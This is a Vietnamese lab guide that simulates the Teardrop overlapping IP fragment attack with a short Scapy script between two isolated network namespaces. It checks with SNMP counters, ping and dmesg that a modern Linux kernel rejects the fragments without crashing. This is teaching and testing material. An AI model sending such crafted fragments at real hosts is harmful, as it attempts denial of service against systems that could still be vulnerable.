# HƯỚNG DẪN THỰC HÀNH: LAB 06
## Teardrop Attack (IP Fragmentation Overlap)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Mô phỏng kỹ thuật phân mảnh IP chồng lấn (Overlapping Fragments - CVE-1999-0015) bằng Scapy, gửi 2 mảnh có dải byte đè lên nhau (Mảnh 1: offset 0, dài 24 bytes; Mảnh 2: offset 8, dài 24 bytes $\implies$ chồng lấn 16 bytes). Chứng minh rằng Linux Kernel hiện đại kiểm tra biên an toàn, không bị crash, duy trì 100% sức sống mạng và ghi nhận lỗi vào biến đếm `/proc/net/snmp` (`ReasmFails`).
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim) trên `veth2`

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

```bash
# Bước 1: Khởi tạo topology mạng cặp host h1 <-> h2
sudo bash docs/progress/LAB06/scripts/setup_pair.sh

# Bước 2: Xem thống kê SNMP trước khi tấn công
sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"

# Bước 3: Mở tcpdump trên veth2 để bắt các mảnh IP đến
sudo ip netns exec h2 timeout 8 tcpdump -i veth2 -nn -v ip &
TCPDUMP_PID=$!
sleep 1

# Bước 4: Mở luồng ping kiểm tra sức sống liên tục từ h2 về h1
sudo ip netns exec h2 ping -i 0.3 -c 10 10.0.0.1 &

# Bước 5: Phát động gửi các mảnh Teardrop từ h1
sudo ip netns exec h1 python3 docs/progress/LAB06/scripts/teardrop.py
sleep 3

# Bước 6: Kiểm tra lại thống kê SNMP (Kỳ vọng: ReasmFails tăng thêm 1)
sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"

# Bước 7: Kiểm tra dmesg xác nhận Kernel an toàn (không có Crash/Oops)
dmesg | tail -n 10
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:

```bash
# === 1. TẠO MÔI TRƯỜNG MẠNG VETH ===
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo ip netns add h1
sudo ip netns add h2
sudo ip link add veth1 type veth peer name veth2
sudo ip link set veth1 netns h1
sudo ip link set veth2 netns h2
sudo ip netns exec h1 ip link set dev lo up
sudo ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
sudo ip netns exec h1 ip link set dev veth1 up
sudo ip netns exec h2 ip link set dev lo up
sudo ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
sudo ip netns exec h2 ip link set dev veth2 up

# === 2. GHI NHẬN SNMP TRƯỚC TẤN CÔNG ===
echo "=== THỐNG KÊ SNMP TRƯỚC TẤN CÔNG ==="
sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"

# === 3. GỬI 2 MẢNH IP CHỒNG LẤN BẰNG SCAPY ===
sudo ip netns exec h1 python3 -c '
from scapy.all import IP, send
dst = "10.0.0.2"
ipid = 1234
# Mảnh 1: byte 0..23, MF=1
f1 = IP(dst=dst, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)
# Mảnh 2: byte 8..31, MF=0 (chồng lấn byte 8..23)
f2 = IP(dst=dst, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)
send([f1, f2], verbose=0)
print("[+] Đã gửi 2 mảnh Teardrop (ID=1234) với dải chồng lấn 16 bytes")
'
sleep 1

# === 4. KIỂM TRA SỨC SỐNG VÀ THỐNG KÊ SNMP SAU TẤN CÔNG ===
echo "=== KIỂM TRA SỨC SỐNG NẠN NHÂN (PING) ==="
sudo ip netns exec h2 ping -c 3 10.0.0.1

echo "=== THỐNG KÊ SNMP SAU TẤN CÔNG ==="
sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **Bắt gói tcpdump:**
   - Mảnh 1: `id 1234, offset 0, flags [+]` (MF=1), `proto UDP (17), length 44`.
   - Mảnh 2: `id 1234, offset 8, flags [none]` (MF=0), `proto UDP (17), length 44`.
2. **Bộ đếm SNMP (`/proc/net/snmp`):**
   - `ReasmReqds`: Tăng đúng **2** (nhận 2 mảnh cần tái hợp).
   - `ReasmOKs`: Giữ nguyên **0** (từ chối tái hợp mảnh lỗi).
   - `ReasmFails`: Tăng đúng **1** (hủy bỏ phiên tái hợp an toàn).
3. **Sức sống:** Nạn nhân phản hồi ping 100%, 0% packet loss, `dmesg` không có lỗi.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
```

